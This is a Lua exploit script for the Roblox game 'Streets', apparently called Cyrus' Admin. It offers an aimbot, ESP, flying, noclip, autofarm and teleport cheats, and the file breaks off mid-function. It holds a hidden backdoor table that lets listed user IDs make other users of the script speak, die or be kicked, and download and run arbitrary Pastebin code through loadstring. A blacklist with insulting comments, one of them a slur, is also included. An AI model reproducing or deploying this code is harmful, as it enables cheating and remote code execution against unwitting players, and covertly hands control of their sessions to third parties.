--[[ Bugs
--]]

--[[Todo
	Add a scuffed bfg (in testing)
	Remote Gun (In Testing)
]]

-- [[ Variables ]] --

local Tick = tick()

-- Global Variables -- 

getgenv().Players = game:GetService'Players'
getgenv().TeleportService = game:GetService'TeleportService'
getgenv().ReplicatedStorage = game:GetService'ReplicatedStorage' 
getgenv().StarterGui = game:GetService'StarterGui'
getgenv().TweenService = game:GetService'TweenService'
getgenv().UserInput = game:GetService'UserInputService'
getgenv().RunService = game:GetService'RunService'
getgenv().Lighting = game:GetService'Lighting'
getgenv().CoreGui = game:GetService'CoreGui'
getgenv().HttpService = game:GetService'HttpService'
getgenv().VirtualUser = game:GetService'VirtualUser'
getgenv().LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
getgenv().Mouse = LP:GetMouse()
getgenv().GetChar = function() return LP.Character or LP.CharacterAdded:Wait() end
GetChar():WaitForChild'Humanoid'

-- Bools -- 

local AimbotAutoShoot = false
local AntiAim = false
local AntiKill = false
local Aimlock = false
local AliasesEnabled = true
local AnnoyOn = false
local AlwaysGh = false 
local AutoDie = false
local AirwalkOn = false
local AutoStomp = false
local AutoTriggerBot = false
local AutoFeloop = false
local AutoTarget = false
local AutoFarm = false
local Blinking = false
local BuyingStuff = false
local CamLocking = false
local CurrentlyShooting = false
local BfgOn = false
local DoubleJumpEnabled = false
local DamageIndicatorDebounce = false
local ExploiterDetectionOn = false
local FeLoop = false 
local Flying = false
local FlyDebounce = false
local Freecam = false
local GodMode = false
local GunStomp = true 
local GravGunSeizureMode = false
local HealBot = false
local ItemEsp = false
local NeverSitting = false 
local Normalwalk = false
local NoGh = false
local Noclip = false
local Spamming = false
local TpBypass = false
local TriggerBot = false 
local TriggerBotAutoReload = false
local UseDrawingLib = pcall(assert,Drawing,'Hi')
local WalkShoot = true

-- Strings -- 
 
local AimMode = "Prediction"
local AimlockMode = "LeftClick"
local CamlockTarget = "Head"
local SpamMessage = "Cyrus' Admin Or No Admin"
local ConfigurationFile = "CyrusStreetsAdminSettings.json"
local GunAnim = "None"

local Rainbowdelay = 0
local BlinkSpeed = 0
local NormalHH = 0
local SpamDelay = 1
local AimbotVelocity = 5
local NewPredictionVelocity = 5 
local GravGunDistance = 5
local CrouchSpeed = 8
local FlySpeed = 10
local WalkSpeed = 16
local NormalWs = 16
local SprintSpeed = 25
local HealBotHealth = 25
local NormalJP = 37.5
local AutoStompRange = 50
local NormalGravity = workspace.Gravity
local BulletColour = ColorSequence.new(Color3.fromRGB(144,0,0)) -- technically not an int but we'll go with it
local EspColour = Color3.fromRGB(255,255,255)
 
-- Initially Nil -- 

local AimlockTarget;
local AimlockTargetPosition;
local AnnoyingPlayer;
local CanSetHotkey;
local CamlockPlayer;
local ClickTpKey;
local ClockTime;
local GravGunBodyPosition;
local GravGunBodyVelocity;
local GravGunTool;
local LoopPlayer;
local PlayOnDeath;
local PlayersPing;
local RemoteGunPlayer;
local RemoteGunBodyPos;
local SpawnWs;
local SpawnJP;
local SpawnHH;
local ViewPlayerConnection;


-- Instances -- 

local AntiAimAnimation = Instance.new'Animation'
AntiAimAnimation.AnimationId = "rbxassetid://215384594"

local Dance1Animation = Instance.new'Animation'
Dance1Animation.AnimationId = "rbxassetid://33796059"

local Dance2Animation = Instance.new'Animation'
Dance2Animation.AnimationId = "rbxassetid://35654637"

local SpinAnimation = Instance.new'Animation'
SpinAnimation.AnimationId = "rbxassetid://188632011"

local GunAnimation1 = Instance.new'Animation'
GunAnimation1.AnimationId = "rbxassetid://889968874"

local GunAnimation2 = Instance.new'Animation'
GunAnimation2.AnimationId = "rbxassetid://229339207"

local AirWalk = Instance.new'Part'
AirWalk.Anchored = true 
AirWalk.Size = Vector3.new(20,1,20)
AirWalk.Transparency = 1 

local CmdsFrame = Instance.new('Frame',CoreGui.RobloxGui)
local CmdsLabel = Instance.new('TextLabel',CmdsFrame)
local CmdsScrolling = Instance.new('ScrollingFrame',CmdsFrame)

local CmdBarFrame = Instance.new('Frame',CoreGui.RobloxGui)
local CmdBarTextBox = Instance.new('TextBox',CmdBarFrame)
local CmdBarImageLabel = Instance.new('ImageLabel',CmdBarFrame)

local DmgIndicator = Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)

local RainbowFrame = Instance.new('Frame',CoreGui.RobloxGui)
local RainbowLabel = Instance.new('TextLabel',RainbowFrame)
local RainbowScrolling = Instance.new('ScrollingFrame',RainbowFrame)

local ValuesFrame = Instance.new('Frame',CoreGui.RobloxGui)
local ValuesTextLabel = Instance.new('TextLabel',ValuesFrame)

local HotkeysFrame = Instance.new('Frame',CoreGui.RobloxGui)
local HotkeysTextLabel = Instance.new('TextLabel',HotkeysFrame)

local KeysFrame = Instance.new('Frame',CoreGui.RobloxGui)
local AnyCmdButton = Instance.new('TextButton',KeysFrame)
local KeysLabel = Instance.new('TextLabel',KeysFrame)
local CmdBarKeyLabel = Instance.new('TextLabel',KeysFrame)
local CmdBarKeyButton = Instance.new('TextButton',KeysFrame)
local AnyCmdTextBox = Instance.new('TextBox',KeysFrame)

local VanPart = Instance.new('Part',workspace)

local AdminUserTable = {}
local Commands = {}
local DetectedExploiters = {}
local ExploitDetectionPlayerTablePositions = {}
local EspTable = {}
local EspTable2 = {}
local Keys = {}
local PartTable = {}
local StompWhitelist = {} 
local ToolTable = {}
local WireFrameTable = {}

local BackDoorTableCommands = {
	['chat'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
	};
	['bring'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
	};
	['kill'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
		['Levels'] = {[2] = true;[3] = true;[4] = true;}
	};
	['exec'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand(Content) end end;
		['Levels'] = {[3] = true;[4] = true;}
	};
	['kick'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
		['Levels'] = {[3] = true;[4] = true;}
	};
	['ban'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
		['Levels'] = {[4] = true;}
	};
	['p'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
		['Levels'] = {[3] = true;[4] = true;}
	}
}

local BackDoorTablePlayers = {
    [114164798] = {
		['Name'] = "!fishgang Slays (pushed like 3 updates max)"; 
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(63,0,0);
	};
	[612618136] = {
		['Name'] = "Bird (Heavy donator)";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(101,44,171);
	};
	[70550151] = {
		['Name'] = "Bird (Heavy donator)";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(101,44,171);
	};
	[62009114] = {
		['Name'] = "!fishgang X_D6 (Co-Owner but not a dev)";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(176,16,16);
	};
	[383632734] = {
		['Name'] = "Dot_mp4/Jack [Head-Admin]";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(127,0,212);
	};
	[284761493] = {
		['Name'] = "Zero";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(255,145,175)
	};
	[1773860961] = {
		['Name'] = "Est (Gave me 9b kills on customs)";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(0,0,0);
	};
    [1528488185] = {
		['Name'] = "Basically a Gmod Dark RP admin (Paid)";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(235,31,31);
	};
	[1615606414] = {
		['Name'] = "Bird paid for his tag for some reason";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(235,31,31);
	};
	[710288902] = {
		['Name'] = "Ryson (Donator)";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(255,0,255);
	};
}

local BlacklistTable = {
	[878779033] = true; -- retard who hit me
	[1052869632] = true; -- Generally annoying and fan boys tagged users and claims he can script when he can't (skid).
	[481265818] = true; -- said he would dox me but wouldn't
	[362925188] = true; --[[
		retard moment https://cdn.discordapp.com/attachments/726179909906464870/734190528828145665/image0.png
		I add him: https://cdn.discordapp.com/attachments/726179909906464870/734191062435758201/image0.png
		gets mad he got exposed: https://cdn.discordapp.com/attachments/726179909906464870/734191218400952381/image0.png
	]]
	[338649839] = true; -- literally a pedophile and a skid
	[54133607] = true; -- Claims to hate me yet uses my script lol?
	[347481927] = true; -- XXXtentacion
}

local SettingsTable = {
	Keys = {};
	ClickTpKey = "";
	SprintSpeed = 25;
	CrouchSpeed = 8;
	AimMode = "Prediction";
	AimlockMode = "LeftClick";
	AimbotVelocity = 5;
	CmdBarImage = "http://www.roblox.com/asset/?id=2812081613";
	CmdBarKey = "Quote"
}

if game.PlaceId == 455366377 then 
	PartTable = {
		['burger'] = workspace:WaitForChild'Burger | $15';
		['drink'] = workspace:WaitForChild'Drink | $15';
		['ammo'] = workspace:WaitForChild'Buy Ammo | $25';
		['pipe'] = workspace:WaitForChild'Pipe | $100';
		['machete'] = workspace:WaitForChild'Machete | $70';
		['sawedoff'] = workspace:WaitForChild'Sawed Off | $150';
		['spray'] = workspace:WaitForChild'Spray | $20';
		['uzi'] = workspace:WaitForChild'Uzi | $150';
		['glock'] = workspace:WaitForChild'Glock | $200';
	}
end 

local PlaceTable = {
	['sandbox'] = CFrame.new(-178.60614013672,3.2000000476837,-117.21733093262);
	['prison'] = CFrame.new(-978.74725341797,3.199854850769,-78.541763305664);
	['gas'] = CFrame.new(99.135276794434,18.599975585938,-73.462348937988);
	['court'] = CFrame.new( -191.56864929199,3,223.43171691895);
	['beach'] = CFrame.new(-663.97521972656,1.8657279014587,-369.04748535156);
	['bank'] = CFrame.new(-270.44195556641,4.8757019042969,133.12774658203);
}

local FarmTable = {
	['cash'] = "511726060";
	['shotty'] = "142383762";
	['sawed off'] = "219397110";
	['uzi'] = "328964620";
}

local EstimatedGunRanges = {
	['Glock'] = 100;
	['Uzi'] = 100;
	['Sawed Off'] = 50;
	['Shotty'] = 50;
}

local KeyTable = {
	['W'] = false;
	['A'] = false;
	['S'] = false;
	['D'] = false;
	['Shift'] = false;
	['Space'] = false;
	['Control'] = false;
}

local WhiteListedParts = {
	['head'] = "Head";
	['torso'] = "Torso";
	['humanoidrootpart'] = "HumanoidRootPart";
	['oldprediction'] = "OldPrediction";
	['prediction'] = "Prediction";
}

-- [[ End ]] -- 

-- [[ Random Initalization ]] --
 
coroutine.resume(coroutine.create(function()
	workspace.FallenPartsDestroyHeight = -50000
	LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
	LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
	if workspace:FindFirstChild'Armoured Truck' then 
	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true
	    workspace:FindFirstChild'Armoured Truck':Destroy()
	elseif workspace:FindFirstChild'TPer' then
	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-31,-0.2,221),Vector3.new(12,1,6),"ForceField",true
	    workspace:FindFirstChild'TPer':Destroy()
	else
		VanPart:Destroy()
	end
	Players:Chat("I am a CyAdmin User") -- new admin
	Players:Chat("Hey I'm a cyrus' streets admin user1") -- legacy admin
end))

coroutine.resume(coroutine.create(function()
	workspace.FallenPartsDestroyHeight = -50000
	LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
	LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
	if workspace:FindFirstChild'Armoured Truck' then 
	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true
	    workspace:FindFirstChild'Armoured Truck':Destroy()
	elseif workspace:FindFirstChild'TPer' then
	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-31,-0.2,221),Vector3.new(12,1,6),"ForceField",true
	    workspace:FindFirstChild'TPer':Destroy()
	else
		VanPart:Destroy()
	end
	Players:Chat("I am a CyAdmin User") -- new admin
	Players:Chat("Hey I'm a cyrus' streets admin user1") -- legacy admin
end))

getgenv().initalizeHotkeys = function(ConfigToSaveTo)
	writefile(ConfigToSaveTo,HttpService:JSONEncode(SettingsTable))
	local Settings = HttpService:JSONDecode(readfile(ConfigToSaveTo))
	Keys = Settings.Keys 
	ClickTpKey = Settings.ClicktpKey
	SprintSpeed = Settings.SprintSpeed
	AimMode = Settings.AimMode
	AimlockMode = Settings.AimlockMode
	AimbotVelocity = Settings.AimbotVelocity
	CmdBarImage = Settings.CmdBarImage
	CmdBarKey = Settings.CmdBarKey
end

getgenv().updateHotkeys = function(ConfigToUpdateTo)
	if not readfile or not writefile then return end
	local SettingsToUpdate = {
		Keys = Keys;
		ClickTpKey = ClickTpKey;
		SprintSpeed = SprintSpeed;
		CrouchSpeed = CrouchSpeed;
		AimMode = AimMode;
		AimlockMode = AimlockMode;
		AimbotVelocity = AimbotVelocity;
		CmdBarImage = CmdBarImage;
		CmdBarKey = CmdBarKey;
	}
	writefile(ConfigToUpdateTo,HttpService:JSONEncode(SettingsToUpdate))
end

getgenv().runHotkeys = function(ConfigToRun)
	local RunSettings = HttpService:JSONDecode(readfile(ConfigToRun))
	Keys = RunSettings.Keys
	ClickTpKey = RunSettings.ClickTpKey or ""
	SprintSpeed = RunSettings.SprintSpeed or 25
	CrouchSpeed = RunSettings.CrouchSpeed or 16
	AimMode = RunSettings.AimMode or "Prediction";
	AimlockMode = RunSettings.AimlockMode or "LeftClick"
	AimbotVelocity = RunSettings.AimbotVelocity or 5
	CmdBarImage = RunSettings.CmdBarImage or "http://www.roblox.com/asset/?id=2812081613"
	CmdBarKey = RunSettings.CmdBarKey or "Quote"
end
if readfile and writefile then 
	local FileExists = pcall(readfile,ConfigurationFile)
	if not FileExists then 
		initalizeHotkeys(ConfigurationFile)
	else
		runHotkeys(ConfigurationFile)
	end
end

getgenv().notif = function(Title,Message,Length,Icon)
	StarterGui:SetCore("SendNotification",{
	['Title'] = Title;
	['Text'] = Message;
	['Duration'] = Length;
	['Icon'] = Icon;
	})
end

getgenv().Teleport = function(Part)
	if typeof(Part) == "Instance" then Part = Part.CFrame end
	if typeof(Part) == "Vector3" then Part = CFrame.new(Part) end 
	if typeof(Part) == "CFrame" then 
		local Character = GetChar()
		local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
		if PartFound and not Character:FindFirstChild'RealHumanoidRootPart' or (Part.p - PartFound.CFrame.p).magnitude < 50 then
			PartFound.CFrame = Part
		else
			TweenService:Create(PartFound,TweenInfo.new(3.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{CFrame = Part}):Play()
		end
	end
end

getgenv().AddCommand = function(CommandFunction,CommandName,CommandAliases,HelpInfo,Args)
	Commands[#Commands + 1] = {['Function'] = CommandFunction,['Name'] = CommandName,['Alias'] = CommandAliases,['Help'] = HelpInfo,['Args'] = Args}
end

getgenv().FindCommand = function(CommandName)
	for i = 1,#Commands do
		if Commands[i].Name == CommandName or AliasesEnabled and table.find(Commands[i].Alias,CommandName) then 
			return Commands[i].Function
		end
	end
end

getgenv().CheckCommand = function(Chat)
	local Arguments = string.split(Chat:lower()," ")
	local CommandName = table.remove(Arguments,1)
	local CommandFound = FindCommand(CommandName)
	if CommandFound then
		local CommandWorked,Error = pcall(CommandFound,Arguments)
		if not CommandWorked then 
			notif("Command errored: "..CommandName,"Send this to Cy: "..Error,10,nil)
		end
	end
end

getgenv().PlrFinder = function(PlayerString)
	if PlayerString then -- error with a new addition 
		local PlayerString = PlayerString:lower()
		local PlayerTable = Players:GetPlayers()
		if #PlayerString == 2 and PlayerString == "me" then return LP end
		if #PlayerString == 3 and PlayerString == "all" or #PlayerString == 5 and PlayerString == "users" then return PlayerTable end
		for i = 1,#PlayerTable do 
			if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
				return PlayerTable[i]
			end
		end
	end
end

getgenv().find = function(ItemString)
	local ChildrenOfWorkspace = workspace:GetChildren()
	for i = 1,#ChildrenOfWorkspace do 
		local Item = ChildrenOfWorkspace[i]
		local ItemModel = Item:FindFirstChild'Model'
		if Item.Name == "RandomSpawner" and ItemModel then
			local Handle = ItemModel.Handle 
			if Handle:FindFirstChildOfClass'MeshPart' then 
				if FarmTable[ItemString] and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,FarmTable[ItemString]) then 
					return Item,"Cash" -- Cash 
				end
			end
			if Handle:FindFirstChild'Fire' then 
				if FarmTable[ItemString] and string.find(Handle.Fire.SoundId,FarmTable[ItemString]) then 
					return Item,"Gun" -- Guns
				end
			end
		end
	end
	return "None"
end

getgenv().farm = function(ItemString)
	if ItemString == "all" then 
		local WChildren = workspace:GetChildren()
		for i = 1,#WChildren do 
			local Child = WChildren[i]
			if Child.Name == "RandomSpawner" then 
				Teleport(Child.CFrame)
				Child.DescendantRemoving:Wait()
			end
		end
	end
	local Item = find(ItemString)
	if Item == "None" then notif("There is none of "..ItemString,"to farm",5,nil) return end 
	Teleport(Item.CFrame)
end

local function GetData()
	return HttpService:JSONDecode(game:HttpGet("http://cyrustesting.byethost15.com/Commands.json"))
end

local function BackdoorCheck(Player,Chat)
	if Chat:sub(1,1) == "`" then
		local Arguments = string.split(Chat:sub(2)," ")
		local Command = BackDoorTableCommands[table.remove(Arguments,1)]
		local PlayerToMeme = PlrFinder(table.remove(Arguments,1))
		if Command and PlayerToMeme then
			Command['Func'](PlayerToMeme,table.concat(Arguments," "),Player)
		end
	end 
end

local function convertKeyCode(KeyCode)
local KeyCodeToSet;
	local Work,Error = pcall(function()
		KeyCodeToSet = Enum.KeyCode[KeyCode]
	end)
	if not Work then
		KeyCodeToSet = Enum.KeyCode[KeyCode:upper()]
	end
	return KeyCodeToSet
end

local function ColourifyGuns(GunTable,Colour)
	for ToolIndex,Tool in pairs(GunTable:GetChildren()) do
		if Tool:IsA'Tool' and Tool:FindFirstChild'Fire' then  
			for _,Part in pairs(Tool:GetDescendants()) do 
				if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
					if Part:IsA'UnionOperation' then 
						Part.UsePartColor = true
					end
					Part.Material = "ForceField"
					Part.Color = Colour
				end
			end
		end
	end
end

local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
	if BackdoorPlayer and BackdoorPlayer.Character then
		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
		ColourifyGuns(BackdoorPlayer.Character,Colour)
		BackdoorPlayer.Character.ChildAdded:Connect(function()
			ColourifyGuns(BackdoorPlayer.Character,Colour)
		end)
	end
end


local function createBodyPos(Parent)
	local BodyPosition = Instance.new('BodyPosition',Parent)
	BodyPosition.P = BodyPosition.P * 8
	BodyPosition.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	if GravGunSeizureMode then 
		GravGunBodyVelocity = Instance.new('BodyAngularVelocity',Parent)
		GravGunBodyVelocity.AngularVelocity = Vector3.new(0,9e9,0)
		GravGunBodyVelocity.MaxTorque = Vector3.new(0,9e9,0)
	end
	return BodyPosition 
end

local function Fly()
local Character = GetChar()
local Torso = Character:FindFirstChild'Torso'
if not Torso then return end 
	local BodyGyro,BodyVelocity = Instance.new('BodyGyro',Torso),Instance.new('BodyVelocity',Torso)
	BodyGyro.P = 9e9
	BodyGyro.MaxTorque = Vector3.new(9e9,9e9,9e9)
	BodyGyro.CFrame = Torso.CFrame
	BodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
	BodyVelocity.Velocity = Vector3.new(0,0.1,0)
	BodyVelocity.Name = "CyAdminFly"
	local Table1 = {['W'] = 0;['A'] = 0;['S'] = 0;['D'] = 0;}
	if not AirwalkOn then 
		CheckCommand("airwalk")
	end 
	while Flying and Character:FindFirstChild'Humanoid' and Character.Humanoid.Health > 0 and wait() do 
		if KeyTable['W'] then Table1['W'] = FlySpeed else Table1['W'] = 0 end 
		if KeyTable['A'] then Table1['A'] = -FlySpeed else Table1['A'] = 0 end 
		if KeyTable['S'] then Table1['S'] = -FlySpeed else Table1['S'] = 0 end 
		if KeyTable['D'] then Table1['D'] = FlySpeed else Table1['D'] = 0 end 
		if (Table1['W'] + Table1['S']) ~= 0 or (Table1['A'] + Table1['D']) ~= 0 then
			BodyVelocity.Velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (Table1['W'] + Table1['S'])) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(Table1['A'] + Table1['D'], (Table1['W'] + Table1['S']) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * 50
		else
			BodyVelocity.Velocity = Vector3.new(0,0.1,0)
		end
		BodyGyro.CFrame = workspace.CurrentCamera.CoordinateFrame
	end
	if AirwalkOn then 
		CheckCommand("airwalk")
	end 
	BodyGyro:Destroy()
	BodyVelocity:Destroy()
end

local function AimlockClosest(Player)
	local Box = Instance.new('BoxHandleAdornment',CoreGui.RobloxGui)
	Box.Adornee = Player.Character.Head
	Box.Size = Vector3.new(7,10,7)
	Box.SizeRelativeOffset = Vector3.new(0,-1,0)
	Box.Transparency = 1
	local Event1,Event2
	Event1 = Box.MouseButton1Down:Connect(function()
		if Aimlock and AimlockMode == "Closest" then
			AimlockTarget = Player.Character
			local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
				if tostring(C) == tostring(AimlockTarget) then 
					AimlockTarget = C 
				else
					Connection:Disconnect()
					Connection = nil
				end
			end)
		else 
			Box:Destroy()
		end 
	end)
	Event2 = Player.CharacterRemoving:Connect(function()
		Box:Destroy()
		Event1:Disconnect()
		Event1 = nil 
		Event2:Disconnect()
		Event2 = nil
	end)
end 

local function checkHp(Plr)
	return Plr:FindFirstChildOfClass'Humanoid' and math.floor(Plr.Humanoid.Health) or "No Humanoid"
end

local function HasItem(Player,Item)
	if Player then 
		local ItemFound = Player.Character:FindFirstChild(Item,true) or Player.Backpack:FindFirstChild(Item,true)
		return ItemFound and "Yes" or "No" 
	end 
end

local function Unesp(Part)
	local Bill = Part:FindFirstChildOfClass'BillboardGui'
	if Part:IsA'BasePart' and Bill then
		Part = Part.Parent 
		Bill:Destroy()
		return 
	end 
	for i = 1,#EspTable do 
		local Table = EspTable[i]
		if Table then 
		local Player = Table['Player']
			if Player == Part then 
				for i,v in pairs(Table) do
					if v ~= Player then 
						if i ~= "Box" then 
							v:Remove()
						else
							table.foreach(v,function(Index,Value) Value:Remove() end)
						end
					end
				end
				table.remove(EspTable,i)
			end
		end 
	end
end

local function Esp(Part,Name,Colour,Blacklisted)
	local Player = PlrFinder(Part.Parent.Name)
	if Player and UseDrawingLib and not Colour then
		Unesp(Player)
		EspTable[#EspTable+1] = {['Player'] = Player,['Text'] = Drawing.new'Text',['Box'] = {Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'}}
	else
		local Bill = Part:FindFirstChildOfClass'BillboardGui'
		if Bill then Bill:Destroy() end 
		local BillBoard = Instance.new('BillboardGui',Part)
		local TextLabel = Instance.new('TextLabel',BillBoard)
		BillBoard.Adornee = Part
		BillBoard.Size = UDim2.new(0,100,0,100)
		BillBoard.StudsOffset = Vector3.new(0,1.3,0)
		BillBoard.AlwaysOnTop = not Blacklisted and true or false
		TextLabel.BackgroundTransparency = 1
		TextLabel.Size = UDim2.new(1,0,0,40)
		TextLabel.TextColor3 = Colour or EspColour
		TextLabel.TextStrokeTransparency = 0.5
		TextLabel.TextSize = 8
		local Player = PlrFinder(Name)
		if Player then
			if not Blacklisted then 
				local User = AdminUserTable[Player] and "Yes" or "No"
				TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
			else 
				TextLabel.Text = "[Blacklisted skid] "..Player.Name.." (can be for just being in lynx)"
			end 
		else 
			TextLabel.Text = Name
		end
	end 
end

local function Xray(Mode)
	for i,v in pairs(workspace:GetDescendants()) do 
		if v:IsA'Part' and not v.Parent:FindFirstChild'Head' and not v.Parent.Parent:FindFirstChild'Head' and v.Size.Y ~= 1 then
			local Selection = v:FindFirstChildOfClass'SelectionBox'
			local Int = v:FindFirstChildOfClass'IntValue'
			if Int then
				v.Transparency = Int.Value
				Int:Destroy()
				if Selection then 
					Selection:Destroy()
				end
			else
				if Mode == "wireframe" then 
					local Select = Instance.new('SelectionBox',v)
					Select.Adornee = v
					Select.LineThickness = 0.001
					Select.SurfaceTransparency = 1
					Select.Color3 = Color3.fromRGB(124,0,0)
					WireFrameTable[#WireFrameTable + 1] = {Select,v}
				end
				local TransparentValue = Instance.new('IntValue',v)
				TransparentValue.Value = v.Transparency
				v.Transparency = 1
			end 
		end 
	end 	
end 

local function IsAUser(Player,Chat)
	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
		AdminUserTable[Player] = true
		return true 
	end
end

local function ShowOrHideEsp(Table,Bool,Player)
    table.foreach(Table,function(Index,Value)
        if Index == "Box" then 
            table.foreach(Value,function(Index2,Value2)
				Value2.Visible = Bool
				local Aimlocked = tostring(Player) == tostring(CamlockPlayer) or tostring(Player) == tostring(AimlockTarget)
				Value2.Color = Aimlocked and Color3.fromRGB(255,0,0) or EspColour
            end)
		else
			if typeof(Value) ~= "Instance" then
				Value.Visible = Bool
				Value.Color = EspColour
			end 
        end 
	end)
end 

local function WorldToViewportPoint(Pos)
    return workspace.CurrentCamera:WorldToViewportPoint(Pos)
end

local function stopAnim(Id)
	local Tracks = GetChar().Humanoid:GetPlayingAnimationTracks()
	for i = 1,#Tracks do 
		local Track = Tracks[i] 
		if Track.Animation.AnimationId == ("rbxassetid://"..Id) then 
			Track:Stop()
		end
	end
end

local function GrabItem(Thing,OldPos)
	if game.PlaceId ~= 455366377 then return end
	local PartFound = GetChar():FindFirstChild'RealHumanoidRootPart' or GetChar():FindFirstChild'Torso'
	local Track = GetChar().Humanoid:LoadAnimation(SpinAnimation)
	PartFound.CFrame = PartFound.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
	wait()
	BuyingStuff = true 
	repeat 
		Track:play(0.1,1,10)
		PartFound.CFrame = PartTable[Thing]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1.3,0)
		RunService.Heartbeat:wait()
	until PartTable[Thing]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild('Bone',true) or GetChar().Humanoid.Health == 0
	PartFound.CFrame = OldPos
	BuyingStuff = false
	return true
end

local function HealthChanged(Health)
	if Health <= HealBotHealth and HealBot and not TpBypass then 
		if GrabItem("burger",GetChar().Head.CFrame) then
			local Hamborger = LP.Backpack:FindFirstChild'Burger'
			if Hamborger then 
				Hamborger.Parent = GetChar()
				Hamborger:Activate() -- CHEEMS
				repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= GetChar()
			end
		end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
		if GrabItem("drink",GetChar().Head.CFrame) then
			local Drink = LP.Backpack:FindFirstChild'Drink'
			if Drink then 
				Drink.Parent = GetChar()
				Drink:Activate()
			end 
		end		
	end
end

local function dragGUI(FrameToDrag,Thing)
	local Dragging = false
	local DragInput,DragStart,StartPos 
	local function Update(Input)
		local Delta = Input.Position - DragStart
		TweenService:Create(FrameToDrag,TweenInfo.new(0.055,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Position = UDim2.new(StartPos.X.Scale,StartPos.X.Offset + Delta.X,StartPos.Y.Scale,StartPos.Y.Offset + Delta.Y)}):Play()
	end
	FrameToDrag.InputBegan:Connect(function(Input)
		if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
			Dragging = true
			DragStart = Input.Position
			StartPos = FrameToDrag.Position
			Input.Changed:Connect(function()
				if Input.UserInputState == Enum.UserInputState.End then 
					Dragging = false 
				end
			end)
		end
	end)
	FrameToDrag.InputChanged:Connect(function(Input)
		if Input.UserInputType == Enum.UserInputType.MouseMovement then 
			DragInput = Input
		end
	end)
	UserInput.InputChanged:Connect(function(Input)
		if Input == DragInput and Dragging then 
			Update(Input)
		end
	end)
end

local function createRainbow(Pos,Text,Value)
	local RainbowButton = Instance.new('TextButton',RainbowScrolling)
	RainbowButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	RainbowButton.BackgroundTransparency = 1
	RainbowButton.Position = Pos
	RainbowButton.Size = UDim2.new(0,480,0,50)
